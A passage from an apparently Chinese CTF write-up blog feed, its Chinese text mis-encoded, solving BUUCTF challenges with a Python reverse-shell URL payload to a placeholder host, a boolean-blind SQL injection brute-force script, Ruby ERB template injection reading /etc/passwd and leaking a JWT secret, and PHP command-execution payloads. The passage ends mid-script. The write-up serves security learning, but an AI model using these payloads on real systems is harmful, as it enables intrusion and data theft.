href="#tipsï¼š">ğŸ­</a>tipsï¼š</h4><p>ç³»ç»Ÿä¸­å½“å‰è¿è¡Œçš„æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰å¯¹åº”çš„ä¸€ä¸ªç›®å½•åœ¨/procä¸‹ï¼Œä»¥è¿›ç¨‹çš„ PIDå·ä¸ºç›®å½•åï¼Œå®ƒä»¬æ˜¯è¯»å–è¿›ç¨‹ä¿¡æ¯çš„æ¥å£ã€‚è€Œselfç›®å½•åˆ™æ˜¯è¯»å–è¿›ç¨‹æœ¬èº«çš„ä¿¡æ¯æ¥å£ï¼Œæ˜¯ä¸€ä¸ªlinkã€‚æŸä¸ªè¿›ç¨‹æƒ³è¦è·å–æœ¬è¿›ç¨‹çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡è¿›ç¨‹çš„pidæ¥è®¿é—®/proc/$pid/ç›®å½•ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¿˜éœ€è¦è·å–è¿›ç¨‹pidï¼Œåœ¨forkã€daemonç­‰æƒ…å†µä¸‹pidè¿˜å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚ä¸ºäº†æ›´æ–¹ä¾¿çš„è·å–æœ¬è¿›ç¨‹çš„ä¿¡æ¯ï¼Œlinuxæä¾›äº†/proc/self/ç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ¯”è¾ƒç‹¬ç‰¹ï¼Œä¸åŒçš„è¿›ç¨‹è®¿é—®è¯¥ç›®å½•æ—¶è·å¾—çš„ä¿¡æ¯æ˜¯ä¸åŒçš„ï¼Œå†…å®¹ç­‰ä»·äº/proc/æœ¬è¿›ç¨‹pid/ã€‚è¿›ç¨‹å¯ä»¥é€šè¿‡è®¿é—®/proc/self/ç›®å½•æ¥è·å–è‡ªå·±çš„ç³»ç»Ÿä¿¡æ¯ï¼Œè€Œä¸ç”¨æ¯æ¬¡éƒ½è·å–pidã€‚<br>å¾—åˆ°keyåæ‰§è¡Œå‘½ä»¤åªå›æ˜¾okéœ€è¦åå¼¹shell</p><pre><code class="hljs angelscript">/no_one_know_the_manager?key=<span class="hljs-number">2e3658</span>a3c99be231c2b3b0cc260528c4&amp;shell=python%<span class="hljs-number">20</span>-c%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">27</span><span class="hljs-keyword">import</span>%<span class="hljs-number">20</span>socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%<span class="hljs-number">22</span>xx.xx.xx.xx%<span class="hljs-number">22</span>,<span class="hljs-number">8080</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>);os.dup2(s.fileno(),<span class="hljs-number">1</span>);%<span class="hljs-number">20</span>os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([%<span class="hljs-number">22</span>/bin/bash%<span class="hljs-number">22</span>,%<span class="hljs-number">22</span>-i%<span class="hljs-number">22</span>]);%<span class="hljs-number">27</span></code></pre><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_43610673/article/details/106196856">https://blog.csdn.net/weixin_43610673/article/details/106196856</a></p><h1>[GYCTF2020]Ezsqli</h1><p>æµ‹è¯•å‘ç°è¿‡æ»¤äº† union select, or ç­‰ï¼Œè¾“å…¥ 1&amp;&amp;1=1 å’Œè¾“å…¥1&amp;&amp;1=2 æ—¶ï¼Œå‘ç°å›æ˜¾ä¸åŒï¼Œæ‰€ä»¥å­˜åœ¨å¸ƒå°”ç›²æ³¨ã€‚information_schema.columnsä¸èƒ½ç”¨äº†ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨sys.schema_table_statisticsã€‚</p><p>åº“å:</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>^(ascii(substr((select database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">0</span>)</code></pre><p>give_grandpa_pa_pa_pa</p><p>è¡¨åï¼š</p><pre><code class="hljs pgsql"><span class="hljs-number">0</span>^(ascii(substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> sys.schema_table_statistics_with_buffer <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">0</span>)</code></pre><p>f1ag_1s_h3r3_hhhhh</p><p>æ— åˆ—åæ³¨å…¥</p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>^((<span class="hljs-number">1</span>,&#x27; g&#x27;)&gt;(select * from f<span class="hljs-number">1</span>ag_<span class="hljs-number">1</span>s_h<span class="hljs-number">3</span>r<span class="hljs-number">3</span>_hhhhh))</code></pre><ul><li>å•å¼•å·é‡Œé¢çš„å­—æ¯ä¸è¡¨ä¸­æ•°æ®çš„å­—æ¯è¿›è¡Œacsiiæ¯”è¾ƒ</li><li>å½“å°äºç­‰äºfçš„æ—¶å€™ï¼Œæ˜¯1<sup>0ï¼Œå›æ˜¾Nu1Lï¼Œå½“å¤§äºfï¼Œå³gä¹‹ç±»çš„å­—ç¬¦æ—¶ï¼Œæ˜¯1</sup>1ï¼Œè¿”å›Error Occured When Fetch Result.</li><li>æ‰€ä»¥æœ€åçš„midè¦å‡ä¸€æ‰æ˜¯æ­£ç¡®çš„å­—ç¬¦</li><li>ä¼ å…¥åå…­è¿›åˆ¶ï¼Œmysqlä¼šè‡ªåŠ¨å°†åå…­è¿›åˆ¶è½¬ä¸ºå­—ç¬¦</li><li>mysqlä¸åŒºåˆ†å¤§å°å†™ï¼Œæ¯”è¾ƒçš„æ—¶å€™O(0x4f)çš„asciiæ¯”f(0x66)çš„asciiå°ï¼Œä½†æ˜¯æ¯”è¾ƒçš„ç»“æœæ˜¯Oæ¯”få¤§</li></ul><p>è„šæœ¬ï¼š</p><pre><code class="hljs apache"><span class="hljs-attribute">import</span> requests<span class="hljs-attribute">url</span> = &#x27;http://<span class="hljs-number">8</span>f<span class="hljs-number">065</span>c<span class="hljs-number">71</span>-<span class="hljs-number">29</span>b<span class="hljs-number">8</span>-<span class="hljs-number">497</span>b-<span class="hljs-number">9</span>cf<span class="hljs-number">0</span>-<span class="hljs-number">484</span>ee<span class="hljs-number">1</span>bf<span class="hljs-number">8</span>aa<span class="hljs-number">5</span>.node<span class="hljs-number">4</span>.buuoj.cn/&#x27;<span class="hljs-attribute">flag</span>=&#x27;FLAG&#123;&#x27;<span class="hljs-attribute">for</span> j in range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    <span class="hljs-attribute">for</span> x in range(<span class="hljs-number">28</span>, <span class="hljs-number">128</span>):        <span class="hljs-attribute">flag1</span> = flag+chr(x)        <span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;0^((select 1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.format(flag<span class="hljs-number">1</span>)        <span class="hljs-attribute">data</span> = &#123;&#x27;id&#x27;: payload&#125;        <span class="hljs-attribute">re</span> = requests.post(url=url, data=data)        <span class="hljs-attribute">if</span> &#x27;Nu<span class="hljs-number">1</span>L&#x27; in re.text:            <span class="hljs-attribute">break</span>;    <span class="hljs-attribute">flag</span>  += chr(x-<span class="hljs-number">1</span>)    <span class="hljs-attribute">print</span>(flag)    <span class="hljs-attribute">print</span>(flag.lower())</code></pre><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/h3ng/p/12904606.html">https://www.cnblogs.com/h3ng/p/12904606.html</a></p>]]></content>
    
    
    <categories>
      
      <category>åˆ·é¢˜</category>
      
      <category>æ— åˆ—åæ³¨å…¥</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse shell</tag>
      
      <tag>proc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuï¼ˆäºŒï¼‰</title>
    <link href="/2021/07/27/ruby/"/>
    <url>/2021/07/27/ruby/</url>
    
    <content type="html"><![CDATA[<h1>[SCTF2019]Flag Shop</h1><h2 id="Ruby-ERBæ¨¡æ¿æ³¨å…¥"><a class="header-anchor" href="#Ruby-ERBæ¨¡æ¿æ³¨å…¥">ğŸ­</a>Ruby ERBæ¨¡æ¿æ³¨å…¥</h2><p>Ruby/ERBä»£ç è¯­æ³•ä¸­è¾ƒæœ‰ç‰¹å¾çš„å°±æ˜¯<code>&lt;%=</code>,<code>&lt;%=</code>è¯­æ³•å¯ä»¥ç”¨æ¥æ‰§è¡ŒRubyè¯­å¥ï¼Œå¹¶å°†ç»“æœè½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚æˆ‘ä»¬å¯ç”¨<code>ruby &lt;%= 7 * 7 %&gt;</code>æ¥æµ‹è¯•æ˜¯å¦å«æœ‰æ¨¡æ¿æ³¨å…¥ã€‚è‹¥å­˜åœ¨æ¨¡æ¿æ³¨å…¥æ¼æ´å°±å¯ä»¥ç”¨<code>ruby &lt;%= File.open(â€˜/etc/passwdâ€™).read %&gt;</code>è¯•è¯•çœ‹èƒ½å¦è‡ªå¸¦çš„å…¨å±€å‡½æ•°ã€‚</p><p>ä¸€èˆ¬ç³»ç»Ÿé˜»æ­¢æˆ‘ä»¬è®¿é—®<strong>File.open</strong>å‡½æ•°ã€‚Rubyçš„ERBæ¨¡æ¿å¼•æ“åŒ…å«ä¸€ä¸ªå®‰å…¨çº§åˆ«ï¼ˆsafe levelï¼‰å‚æ•°ï¼Œå½“å®‰å…¨çº§åˆ«è®¾ç½®ä¸º0ä»¥ä¸Šçš„æŸä¸ªå€¼æ—¶ï¼Œæˆ‘ä»¬æ— æ³•åœ¨æ¨¡æ¿ç»‘å®šï¼ˆtemplate  bindingï¼‰ä¸­æ‰§è¡ŒåŒ…æ‹¬æ–‡ä»¶æ“ä½œåœ¨å†…çš„æŸäº›å‡½æ•°ã€‚4æ˜¯æœ€ä¸ºä¸¥æ ¼çš„éš”ç¦»æœºåˆ¶ï¼Œåªèƒ½æ‰§è¡Œæ ‡è®°ä¸ºå¯ä¿¡çŠ¶æ€çš„é‚£äº›ä»£ç ã€‚è¿™æ—¶æˆ‘ä»¬éœ€è¦å°è¯•è®¸å¤šæ”»å‡»é¢ã€‚</p><p>å¦‚æœæˆ‘ä»¬æƒ³åˆ†æselfå¯¹è±¡ï¼ˆself-objectï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æšä¸¾è¯¥å¯¹è±¡å¯ç”¨çš„å±æ€§åŠæ–¹æ³•ï¼š</p><pre><code class="hljs erb"><span class="xml">ruby <span class="hljs-tag">&lt;<span class="hljs-name">%=</span></span></span><span class="ruby"> <span class="hljs-keyword">self</span> </span><span class="xml"><span class="hljs-tag">%&gt;</span></span></code></pre><p>è·å–selfå¯¹è±¡çš„ç±»åï¼š</p><pre><code class="hljs erb"><span class="xml">ruby <span class="hljs-tag">&lt;<span class="hljs-name">%=</span></span></span><span class="ruby"> <span class="hljs-keyword">self</span>.<span class="hljs-keyword">class</span>.name </span><span class="xml"><span class="hljs-tag">%&gt;</span></span></code></pre><p>æšä¸¾æ­¤ç±»çš„å¯ç”¨æ–¹æ³•ï¼š</p><pre><code class="hljs erb"><span class="xml">ruby <span class="hljs-tag">&lt;<span class="hljs-name">%=</span></span></span><span class="ruby"> <span class="hljs-keyword">self</span>.methods </span><span class="xml"><span class="hljs-tag">%&gt;</span></span></code></pre><p>æ ¹æ®è¿”å›çš„å‡½æ•°ï¼Œæ€è€ƒå“ªäº›æ•°æ®å¯ä»¥ä¼ é€’ç»™è¿™äº›å‡½æ•°ï¼Œä»¥å®ç°æœªæˆæƒè®¿é—®ç›®çš„ã€‚Rubyæä¾›äº†å¼ºå¤§çš„å…ƒç¼–ç¨‹ï¼ˆmetaprogrammingï¼‰ä»¥åŠå†…çœï¼ˆintrospectionï¼‰åŠŸèƒ½ï¼Œè¯¦è§ï¼š<a href="http://ruby-metaprogramming.rubylearning.com/">Metaprogramming in Ruby</a>ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶ä¸­æŸäº›åŠŸèƒ½ï¼ˆå¦‚å‰é¢æåˆ°çš„ç±»çš„.methodsä»¥åŠ.nameæ–¹æ³•ï¼‰æ¥æ¢ç´¢ç¨‹åºçš„å†…éƒ¨ç»“æ„ã€‚ç”±äºæˆ‘ä»¬æ­£å¾€æœåŠ¡å™¨å‘é€HTTP POSTè¯·æ±‚ï¼Œæˆ‘ä»¬å¾ˆæœ‰å¯èƒ½å¤„äºhandlePOSTæˆ–è€…doPOSTå‡½æ•°å†…éƒ¨ã€‚</p><p>è·å–ç›®æ ‡æ‰€éœ€çš„å…·ä½“å‚æ•°ï¼š</p><pre><code class="hljs erb"><span class="xml">ruby <span class="hljs-tag">&lt;<span class="hljs-name">%=</span></span></span><span class="ruby"> <span class="hljs-keyword">self</span>.method(<span class="hljs-symbol">:handle_POST</span>).parameters </span><span class="xml"><span class="hljs-tag">%&gt;</span></span></code></pre><p>ç¡®è®¤sessionå¯¹è±¡çš„å…·ä½“å«ä¹‰ï¼š</p><pre><code class="hljs pgsql">ruby &lt;%= <span class="hljs-keyword">session</span>.<span class="hljs-keyword">class</span>.name %&gt;</code></pre><p>é€šè¿‡è°ƒç”¨.instance_variablesæ–¹æ³•æŸ¥çœ‹å¯¹è±¡åŒ…å«å“ªäº›æˆå‘˜å˜é‡ï¼š</p><pre><code class="hljs mel">ruby &lt;%=@server.instance_variables %&gt;</code></pre><p>æ¥ä¸‹æ¥æ‰¾å‡ºå¯èƒ½ä¼šåŒ…å«æŸäº›å¯†é’¥æˆ–è€…å…¶ä»–æœ‰ç”¨çš„ä¿¡æ¯çš„å˜é‡ã€‚ç”¨&lt;%åˆ›å»ºè‡ªå·±çš„å±€éƒ¨å˜é‡ï¼Œä¿å­˜å˜é‡çš„å¼•ç”¨ï¼ˆæ–¹ä¾¿éšååœ¨æ¨¡æ¿ä¸­å¼•ç”¨ï¼‰</p><pre><code class="hljs mel">ruby &lt;% ssl=@server.instance_variable_get(:å˜é‡å) %&gt;&lt;%= ssl.instance_variables %&gt;</code></pre><p>æå–å˜é‡å€¼ï¼š</p><pre><code class="hljs mel">ruby &lt;% ssl = @server.instance_variable_get(:å˜é‡å) %&gt;&lt;%= ssl.instance_variable_get(:å€¼) %&gt;</code></pre><p>è¯¦è§ï¼š<a href="https://www.anquanke.com/post/id/86867">Ruby ERBæ¨¡æ¿æ³¨å…¥</a></p><h4 id="è§£é¢˜"><a class="header-anchor" href="#è§£é¢˜">ğŸ­</a>è§£é¢˜</h4><p>é¢˜ç›®é¡µé¢å¯ä»¥è´­ä¹°flagï¼Œrobots.txtæç¤ºäº†<code>/filebak</code></p><pre><code class="hljs elixir"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/cookies&#x27;</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/json&#x27;</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;jwt&#x27;</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;securerandom&#x27;</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;erb&#x27;</span>set <span class="hljs-symbol">:public_folder</span>, File.dirname(__FILE__) + <span class="hljs-string">&#x27;/static&#x27;</span>FLAGPRICE = <span class="hljs-number">1000000000000000000000000000</span>ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] = SecureRandom.hex(<span class="hljs-number">64</span>)configure <span class="hljs-keyword">do</span>  enable <span class="hljs-symbol">:logging</span>  file = File.new(File.dirname(__FILE__) + <span class="hljs-string">&#x27;/../log/http.log&#x27;</span>,<span class="hljs-string">&quot;a+&quot;</span>)  file.sync = <span class="hljs-keyword">true</span>  <span class="hljs-keyword">use</span> Rack::CommonLogger, file<span class="hljs-keyword">end</span>get <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">do</span>  redirect <span class="hljs-string">&#x27;/shop&#x27;</span>, <span class="hljs-number">302</span><span class="hljs-keyword">end</span>get <span class="hljs-string">&quot;/filebak&quot;</span> <span class="hljs-keyword">do</span>  content_type <span class="hljs-symbol">:text</span>  erb IO.binread __FILE__<span class="hljs-keyword">end</span>get <span class="hljs-string">&quot;/api/auth&quot;</span> <span class="hljs-keyword">do</span>  payload = &#123; <span class="hljs-symbol">uid:</span> SecureRandom.uuid , <span class="hljs-symbol">jkl:</span> <span class="hljs-number">20</span>&#125;  auth = JWT.encode payload,ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span>  cookies[<span class="hljs-symbol">:auth</span>] = auth<span class="hljs-keyword">end</span>get <span class="hljs-string">&quot;/api/info&quot;</span> <span class="hljs-keyword">do</span>  islogin  auth = JWT.decode cookies[<span class="hljs-symbol">:auth</span>],ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-keyword">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;  json(&#123;<span class="hljs-symbol">uid:</span> auth[0][<span class="hljs-string">&quot;uid&quot;</span>],<span class="hljs-symbol">jkl:</span> auth[0][<span class="hljs-string">&quot;jkl&quot;</span>]&#125;)<span class="hljs-keyword">end</span>get <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span>  erb <span class="hljs-symbol">:shop</span><span class="hljs-keyword">end</span>get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span>  islogin  auth = JWT.decode cookies[<span class="hljs-symbol">:auth</span>],ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-keyword">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;  auth = auth[0]  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-keyword">nil</span>?    if ENV[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)      puts ENV[<span class="hljs-string">&quot;FLAG&quot;</span>]    <span class="hljs-keyword">end</span>  <span class="hljs-keyword">end</span>  if params[<span class="hljs-symbol">:do</span>] == <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][0,<span class="hljs-number">7</span>]&#125;</span> is working&quot;</span> <span class="hljs-keyword">then</span>    auth[<span class="hljs-string">&quot;jkl&quot;</span>] = auth[<span class="hljs-string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="hljs-number">10</span>)    auth = JWT.encode auth,ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span>    cookies[<span class="hljs-symbol">:auth</span>] = auth    ERB::new(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][0,<span class="hljs-number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result  <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span>post <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span>  islogin  auth = JWT.decode cookies[<span class="hljs-symbol">:auth</span>],ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-keyword">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;  if auth[0][<span class="hljs-string">&quot;jkl&quot;</span>] &lt; FLAGPRICE <span class="hljs-keyword">then</span>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;no enough jkl&quot;</span>&#125;)  else    auth &lt;&lt; &#123;<span class="hljs-symbol">flag:</span> ENV[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;    auth = JWT.encode auth,ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span>    cookies[<span class="hljs-symbol">:auth</span>] = auth    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;jkl is good thing&quot;</span>&#125;)  <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">islogin</span></span>  if cookies[<span class="hljs-symbol">:auth</span>].<span class="hljs-keyword">nil</span>? <span class="hljs-keyword">then</span>    redirect to(<span class="hljs-string">&#x27;/shop&#x27;</span>)  <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span></code></pre><p>workä¸‹æœ‰ä¸²ä»£ç ï¼š</p><pre><code class="hljs markdown">if params[<span class="hljs-string">:do</span>] == &quot;#&#123;params[<span class="hljs-string">:name</span>][<span class="hljs-symbol">0,7</span>]&#125; is working&quot; then<span class="hljs-code">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><span class="hljs-code">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><span class="hljs-code">    cookies[:auth] = auth</span><span class="hljs-code">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span></code></pre><p>ä¼ å…¥çš„doå‚æ•°å’Œnameå‚æ•°ä¸€è‡´ï¼Œä¼šè¾“å‡º<code>&#123;params[:name][0,7]&#125; working successfully!</code></p><p>rubyé¢„å®šä¹‰ä¸­</p><p><img src="/2021/07/27/ruby/1.png" alt="1"></p><p>æ„é€ <code>do=&lt;%=$'%&gt; is working</code>å’Œ<code>name=&lt;%=$'%&gt;</code>ï¼ˆå†…å®¹16è¿›åˆ¶ç¼–ç ï¼‰</p><p><img src="/2021/07/27/ruby/2.png" alt="2"></p><p>å¾—åˆ°secretï¼ŒJWTç¼–ç ï¼Œjklå¤§äºflagçš„ä»·é’±å³å¯</p><p><img src="/2021/07/27/ruby/5.png" alt="5"></p><p>ä¼ å€¼</p><p><img src="/2021/07/27/ruby/4.png" alt="4"></p><p>JWTè§£ç </p><p><img src="/2021/07/27/ruby/6.png" alt="6"></p><p>å‚è€ƒï¼š</p><p><a href="https://www.anquanke.com/post/id/86867">https://www.anquanke.com/post/id/86867</a></p><p><a href="https://www.freesion.com/article/3596467969/">https://www.freesion.com/article/3596467969/</a></p><h1>[CISCN 2019 åˆèµ›]Love Math</h1><h4 id="å‰ç½®çŸ¥è¯†"><a class="header-anchor" href="#å‰ç½®çŸ¥è¯†">ğŸ­</a>å‰ç½®çŸ¥è¯†</h4><p><strong>åŠ¨æ€å‡½æ•°</strong></p><p>phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°ä¾‹å¦‚ï¼š<code>$function = &quot;sayHello&quot;;$function();</code></p><p><strong>phpä¸­å‡½æ•°åé»˜è®¤ä¸ºå­—ç¬¦ä¸²</strong></p><p>ä¾‹å¦‚æœ¬é¢˜ç™½åå•ä¸­çš„asinhå’Œpiå¯ä»¥ç›´æ¥å¼‚æˆ–ï¼Œè¿™å°±å¢åŠ äº†æ„é€ å­—ç¬¦çš„é€‰æ‹©</p><h4 id="è§£é¢˜-v2"><a class="header-anchor" href="#è§£é¢˜-v2">ğŸ­</a>è§£é¢˜</h4><p>æºç é™åˆ¶äº†å­—ç¬¦é•¿åº¦ï¼Œåˆ—äº†ä¸€äº›é»‘åå•ï¼Œç™½åå•åªæœ‰æ•°å­¦å‡½æ•°å’Œ<code>. ^</code></p><h5 id="payload1"><a class="header-anchor" href="#payload1">ğŸ­</a>payload1:</h5><pre><code class="hljs sqf">$<span class="hljs-literal">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));($$<span class="hljs-literal">pi</span>)&#123;<span class="hljs-literal">pi</span>&#125;(($$<span class="hljs-literal">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-literal">pi</span>=system&amp;<span class="hljs-built_in">abs</span>=tac <span class="hljs-built_in">flag</span>.php</code></pre><blockquote><p>base_convert(37907361743,10,36) =&gt; â€œhex2binâ€ dechex(1598506324) =&gt; â€œ5f474554â€ $pi=hex2bin(â€œ5f474554â€) =&gt; $pi=â€œ_GETâ€   //hex2binå°†ä¸€ä¸²16è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸² ($$pi){pi}(($$pi){abs}) =&gt; ($_GET){pi}($_GET){abs}  //{}å¯ä»¥ä»£æ›¿[]</p></blockquote><h5 id="payload2"><a class="header-anchor" href="#payload2">ğŸ­</a>payload2:</h5><pre><code class="hljs angelscript">$pi=base_convert,$pi(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)($pi(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)()&#123;<span class="hljs-number">1</span>&#125;)</code></pre><blockquote><p>base_convert(696468,10,36) =&gt; â€œexecâ€ $pi(8768397090111664438,10,30) =&gt; â€œgetallheadersâ€ exec(getallheaders(){1})</p></blockquote><p><strong>getallheaders</strong></p><p>getallheaders â€”è·å–æ‰€æœ‰ HTTP è¯·æ±‚æ ‡å¤´,è¿”å›å½“å‰è¯·æ±‚ä¸­æˆ–**<code>false</code>**å¤±è´¥æ—¶æ‰€æœ‰ HTTP æ ‡å¤´çš„å…³è”æ•°ç»„ ã€‚</p><h5 id="payload3ï¼š"><a class="header-anchor" href="#payload3ï¼š">ğŸ­</a>payload3ï¼š</h5><pre><code class="hljs lisp">//exec(&#x27;hex2bin(<span class="hljs-name">dechex</span>(<span class="hljs-number">109270211257898</span>))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)($pi=base_convert)(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>)($pi(<span class="hljs-number">76478043844</span>,<span class="hljs-number">9</span>,<span class="hljs-number">34</span>)(<span class="hljs-name">dechex</span>(<span class="hljs-number">109270211257898</span>)))//system(&#x27;cat&#x27;.dechex(<span class="hljs-number">16</span>)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</code></pre><h5 id="payload4ï¼š"><a class="header-anchor" href="#payload4ï¼š">ğŸ­</a>payload4ï¼š</h5><pre><code class="hljs angelscript">$pi=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));$pi=$$pi;$pi&#123;<span class="hljs-number">0</span>&#125;($pi&#123;<span class="hljs-number">1</span>&#125;)&amp;<span class="hljs-number">0</span>=system&amp;<span class="hljs-number">1</span>=cat%<span class="hljs-number">20</span>/flag</code></pre><p><img src="/2021/07/27/ruby/7.png" alt="7"></p><p>è„šæœ¬ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$payload = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>,  <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span> , <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, 